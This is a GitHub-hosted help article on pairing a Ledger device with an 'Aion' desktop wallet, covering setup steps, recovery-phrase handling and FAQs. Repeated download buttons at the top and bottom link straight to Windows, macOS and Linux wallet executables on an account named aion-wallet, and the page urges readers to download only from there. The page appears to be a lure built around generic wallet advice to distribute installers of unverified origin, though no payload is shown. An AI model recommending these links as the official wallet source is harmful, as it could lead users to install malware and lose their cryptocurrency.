![Aion Wallet](assets/banner-article.png)

# Aion wallet with Ledger: how it fits

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

A Ledger device signs AION transactions for the desktop wallet through the Aion application installed on the device, which keeps the private key on the hardware while the computer only receives signatures.

That arrangement is the strongest one available for AION, and it comes with a specific set of expectations that are worth learning before you plug anything in, because most disappointment with hardware wallets comes from assuming they do more than they do.

## You'll see this if

- You want AION off a general-purpose computer.
- You have a Ledger device and are looking for the Aion application in the manager.
- A guide told you to add an Aion account in Ledger Live and there is no such option.
- You are deciding whether the device is worth it for a balance you hold long term.

## What the device does

The device stores the key and performs the signature. The transaction is built on the computer, sent to the device for approval, and returned signed. The key never leaves the secure element, so malware on the machine cannot copy it.

That is the entire protection. It does not encrypt your email, it does not stop you signing a transaction you did not read, and it does not remove the need for a recovery phrase.

## What Ledger Live does not do

Ledger Live does not manage AION accounts. The Aion application works with the desktop wallet, and a holder who expects an AION account to appear inside Ledger Live will not find one.

This is the single most common point of confusion, and it is why the pairing described below goes through the wallet rather than through the companion app.

## Setting it up

1. Install the current desktop release from the release page.
2. Connect the device and unlock it with its PIN.
3. Open the device manager, find the Aion application and install it.
4. Open the Aion application on the device and leave it running.
5. Start the desktop wallet and choose the hardware route on the login screen.
6. Approve the connection on the device, then confirm the address that appears matches the account you expect.
7. Send a small test amount before moving a large balance.

If the wallet cannot see the device, the application on the device is usually closed or the cable is charge-only. Both are common and neither indicates a fault with the funds.

## What the device holds, and what it does not

The device holds one recovery phrase, and every application installed on it derives its keys from that phrase. That means the Aion account is protected by the device's phrase, not by a separate Aion backup.

Losing the device is recoverable with that phrase. Losing the phrase is not recoverable with the device. The [Aion wallet forgot password](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-forgot-password.md) article covers the wallet-password case, which is separate again.

## When the device is not the right tool

If you stake by delegating frequently, or if you run a miner that needs a payout address you can change often, the friction of approving every signature adds up. Many holders keep a small hot wallet for operations and the device for the long-term balance, which is a reasonable split.

If you have no secure place to store the device's recovery phrase, the device solves less than it appears to. A hardware wallet with a phrase photographed in a phone is not much safer than a software wallet.

## Adding it to an existing wallet

A device can hold an account that already exists if that account's phrase is restored onto the device, but that is a decision to make carefully: restoring a phrase onto the device replaces the device's existing one.

The safer pattern is to create the account on the device and move the balance to it, which leaves the old wallet untouched until the transfer is confirmed.

Where the device sits in the wider picture is a separate question, and the [Aion crypto wallet choices](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-crypto-wallet-choices.md) guide compares it with the other ways to hold AION.

## Prevention

Buy the device from the manufacturer or an authorised reseller, and never from a marketplace listing that arrives pre-configured. A device with a phrase already written on a card is a device someone else controls.

Write the device's phrase on paper and store it separately from the device itself.

Keep the desktop wallet updated. Device pairing and the application on the device both change over time, and an old client is the usual reason a device stops being recognised.

## When the device is not recognised

A device that is plugged in but invisible to the wallet is almost always running without the Aion application open. Unlock it, open the application on the device, then restart the wallet rather than replugging repeatedly.

If the device is recognised but the address differs from the one you expect, the wrong account is selected on the device. That is worth checking before a transfer, and the [how to find your Aion address](https://github.com/aion-wallet/aion-wallet-help/blob/main/how-to-find-your-aion-address.md) guide describes the comparison.

A device that works with another application but not this one points at the desktop side, and the [Aion wallet not syncing](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-not-syncing.md) article covers what a stalled client looks like.

## Frequently asked questions

### Does Aion work with Ledger Live?

The device works through the Aion application and the desktop wallet. Ledger Live does not add AION accounts.

### Which Ledger models support the Aion application?

The Aion application is community-developed and its availability depends on the device model and the manager listing. Check the manager on your device before buying anything for this purpose.

### Can someone steal AION without the device?

Not with the key. They can still trick you into approving a transaction, which is why the address on the device screen is the one to read before confirming.

### Do I need a second backup for the Aion account?

No. The device's phrase covers every application on it, including the Aion one.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Aion crypto wallet choices](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-crypto-wallet-choices.md) - how the hardware route compares with the rest.
- [Aion wallet login options](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-login-options.md) - the three ways into a wallet.
- [Aion Wallet explained](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-explained.md) - what the desktop application does with keys.
- [How to find your Aion address](https://github.com/aion-wallet/aion-wallet-help/blob/main/how-to-find-your-aion-address.md) - reading and checking the address on screen.
